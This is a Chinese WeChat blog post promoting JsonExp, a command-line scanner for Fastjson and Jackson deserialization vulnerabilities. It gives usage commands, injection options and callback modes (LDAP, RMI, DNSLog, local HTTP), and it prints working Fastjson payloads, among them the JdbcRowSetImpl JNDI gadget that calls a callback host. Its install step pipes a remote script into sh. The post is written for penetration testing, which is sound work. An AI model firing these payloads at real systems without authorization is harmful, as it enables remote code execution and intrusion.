---
title: [安全工具]JsonExp — Fastjson/Jackson 反序列化漏洞自动化检测利器
url: https://mp.weixin.qq.com/s/OXo-7q1Gn6gkogcvBcarWg
source: Doonsec's feed
date: 2026-06-20
fetch_date: 2026-06-21T06:48:07.803423
---

# [安全工具]JsonExp — Fastjson/Jackson 反序列化漏洞自动化检测利器

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/5LNgXJargeUicKyDwibdgI0tW4flbhUdNZwMCcfY9QFhNhdY4MTRnqmMVn9dpVgnn1Mddbnpz9QOFHc40Y6jSloL520dClBWVcP1H5XZjMxsE/0?wx_fmt=jpeg)

# [安全工具]JsonExp — Fastjson/Jackson 反序列化漏洞自动化检测利器

原创

niuko
niuko

Ncko

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# [安全工具]JsonExp — Fastjson/Jackson 反序列化漏洞自动化检测利器

> 免责声明：
> 由于传播、利用本公众号Ncko所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

---

## 写在前面

Fastjson 和 Jackson 作为 Java 生态中最常用的两个 JSON 序列化/反序列化库，历年来爆出过不少反序列化漏洞。从 Fastjson 1.2.24 的 `JdbcRowSetImpl` 利用链，到 1.2.68 的 `autoType` 绕过，漏洞版本跨度大、利用链多，手动检测效率很低。

今天给大家分享一款开源工具 —— **JsonExp**，专门针对 Fastjson 和 Jackson 反序列化漏洞进行自动化检测，覆盖面广、使用门槛低，适合渗透测试和漏洞挖掘场景。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/5LNgXJargeVj8icJ0ibxxEnS8Wr2LQRTLUkqfZN3uncmtFS1urVkA1NicQbQxSPyUlRR3d0iazybxiclWyKrdWyPJNyF4lSyHjhwvlYKdy5juhBQ/640?wx_fmt=png&from=appmsg)

---

## 工具简介

JsonExp 是一款命令行检测工具，核心思路是通过构造不同版本的 Payload 注入到目标请求中，结合 LDAP / RMI / DNSLog / 本地 HTTP 四种回连方式验证漏洞是否存在。

**核心特性一览：**

* • **多版本覆盖**：支持 Fastjson 1.2.24 ~ 1.2.68+ 多条利用链
* • **智能注入**：自动识别 Body、URL 参数、Header、Cookie 四种注入位置
* • **多种回连**：LDAP / RMI / DNSLog / 本地 HTTP，适配不同网络环境
* • **批量检测**：单目标、多目标文件、原始请求包三种输入方式
* • **HTML 报告**：自动生成可视化检测报告，支持搜索和相似度排序
* • **响应分析**：内置响应相似度比对，快速定位异常响应

---

## 安装方式

### 方式一：uv（推荐）

```
# 安装 uv
curl -LsSf https://astral.sh/uv/install.sh | sh

# 同步依赖
uv sync

# 运行
uv run python JsonExp.py -h
```

### 方式二：pip

```
pip install -r requirements.txt
python JsonExp.py -h
```

**环境要求：** Python 3.8+，依赖 `requests`、`pycryptodome` 等。

---

## 实战用法

### 1. 单目标检测（LDAP 模式）

最常见的场景，配合 LDAP 服务监听回连：

```
uv run python JsonExp.py -u http://target.com/api/json -l 127.0.0.1:1389
```

### 2. 单目标检测（DNSLog 模式）

适合目标可出网的情况，无需自己搭 LDAP：

```
uv run python JsonExp.py -u http://target.com/api/json --dnslog true
```

### 3. 内网环境检测（本地 HTTP 反连）

目标在内网、无法访问外网时，用本地 HTTP 模式：

```
uv run python JsonExp.py -u http://target.com/api/json --local true -port 8080
```

### 4. 指定注入位置

有时候漏洞点不在 Body 里，可以指定注入位置：

```
# URL 参数注入
uv run python JsonExp.py -u 'http://target.com/api?auth=test' -p auth -l 127.0.0.1:1389

# Cookie 注入
uv run python JsonExp.py -u http://target.com/api -p Cookie -l 127.0.0.1:1389

# Header 注入
uv run python JsonExp.py -u http://target.com/api -p 'Header:Authorization' -l 127.0.0.1:1389
```

### 5. 批量检测

把目标写进文件，一行一个：

```
uv run python JsonExp.py -uf targets.txt -l 127.0.0.1:1389 -to 5
```

### 6. 使用原始请求包

从 Burp Suite 保存请求包，直接丢给工具：

```
uv run python JsonExp.py -req request.txt -l 127.0.0.1:1389
```

---

## 参数速查表

| 参数 | 别名 | 说明 | 示例 |
| --- | --- | --- | --- |
| `-u` | `--url` | 目标 URL | `-u http://target.com/api` |
| `-uf` | `--urlfile` | 目标 URL 文件 | `-uf targets.txt` |
| `-req` | `--request` | 原始请求包文件 | `-req request.txt` |
| `-f` | `--file` | 自定义 Payload 模板 | `-f custom.txt` |
| `-t` | `--type` | HTTP 方法（默认 POST） | `-t get` |
| `-l` | `--ldap` | LDAP 服务地址 | `-l 127.0.0.1:1389` |
| `-r` | `--rmi` | RMI 服务地址 | `-r 127.0.0.1:1099` |
| `-p` | `--param` | 注入参数/位置 | `-p auth` / `-p Cookie` |
| `-to` | `--timeout` | 超时时间（默认 10s） | `-to 5` |
| `-proxy` | `--proxy` | HTTP 代理 | `--proxy http://127.0.0.1:8080` |
| `-dnslog` | `--dnslog` | DNSLog 检测模式 | `--dnslog true` |
| `-local` | `--local` | 本地 HTTP 回连模式 | `--local true` |
| `-port` | `--port` | 本地服务端口（默认 8080） | `-port 9090` |
| `-pro` | `--protocol` | 请求包协议（配合 -req） | `-pro https` |

---

## Payload 模板机制

工具自带 Payload 模板（`template/fastjson.txt`），每行一个 Payload，`#` 后为注释。

模板支持注入方式标记：

```
{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"$type$://$ip$/payload1","autoCommit":true}} #inject:body, Fastjson <=1.2.24
{"@type":"java.net.Inet4Address","val":"$dnslog$"} #inject:body,url,header,cookie DNSlog通用
```

**标记规则：**

* • `#inject:body` — 仅 Body 注入
* • `#inject:body,url,header,cookie` — 全方式适用
* • 未标记 — 默认兼容所有方式

**模板变量：**

* • `$type$` — 协议类型（ldap / rmi / http）
* • `$ip$` — 回连服务地址
* • `$dnslog$` — DNSLog 域名

也就是说，你可以自己往模板里加 Payload，工具会自动加载和匹配。

---

## 检测结果解读

### 终端输出

检测过程中会实时输出每个 Payload 的测试详情：

```
[+] 注入方式：body，已从 30 个 payload 过滤为 26 个
[+] 测试URL：http://target.com/api/json
[+] 请求类型：POST
[+] 序号：1
[+] Payload: {"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.127.0.0.1:1389/payload1","autoCommit":true}}
[+] 响应时长：0.08 秒
[+] 状态码：200 响应体大小：4 字节
```

### 相似度分析

检测结束后自动输出响应相似度比对，**相似度越低越可能是异常响应**：

```
[+] 相似度分析（越接近0%越可能是异常响应）：
序号#1 | 状态码: 200 | 大小: 4B | 相似度: 100.0%
序号#2 | 状态码: 500 | 大小: 1200B | 相似度: 23.5% <-- 异常
```

这个功能很实用，当你发了 30 个 Payload，大部分返回正常响应，突然有一个返回 500 且大小不同，相似度分析一眼就能看出来。

### HTML 报告

检测完成后自动在 `result/` 目录生成 HTML 报告，包含请求/响应详情和相似度分析，方便整理和归档。

---

## 实战场景总结

| 场景 | 推荐方式 | 命令关键参数 |
| --- | --- | --- |
| 目标可出网 | DNSLog | `--dnslog true` |
| 目标在内网 | 本地 HTTP | `--local true -port 8080` |
| 有 LDAP 环境 | LDAP 回连 | `-l 127.0.0.1:1389` |
| 有 RMI 环境 | RMI 回连 | `-r 127.0.0.1:1099` |
| 批量刷目标 | 文件输入 | `-uf targets.txt` |
| Burp 抓包测试 | 原始请求包 | `-req request.txt` |
| 漏洞点在参数里 | 指定注入位置 | `-p auth` / `-p Cookie` |
| 需要挂代理 | HTTP 代理 | `--proxy http://127.0.0.1:8080` |

---

## 写在最后

JsonExp 这款工具覆盖了 Fastjson 和 Jackson 主流版本的利用链，四种回连方式基本能应对各种网络环境。Payload 模板可自定义扩展，相似度分析能帮你快速筛出异常响应，整体设计比较实用。

**几个使用建议：**

1. 1. **先判断目标是否出网**，出网用 DNSLog 最省事，不出网用本地 HTTP
2. 2. **注意注入位置**，不是所有接口都在 Body 里接收 JSON，试试 URL 参数和 Header
3. 3. **合理设置超时**，内网环境可以短一点（`-to 3`），外网适当加长
4. 4. **善用相似度分析**，即使没有回连成功，异常响应也可能暗示漏洞存在

> **获取工具：** 请在公众号发送 **JsonExp** 或 **FastJsonExp**，即可获取对应链接。

---

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/GtFR6uY3nh6MJdyIdsWXrDem00Mia2eSiae1MMcoX2HUKRsPnx0EenFmcMdQwn0qAz5TJfRlOYVF4zsSibLicTlPtA/0?wx_fmt=png)

Ncko

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/GtFR6uY3nh6MJdyIdsWXrDem00Mia2eSiae1MMcoX2HUKRsPnx0EenFmcMdQwn0qAz5TJfRlOYVF4zsSibLicTlPtA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过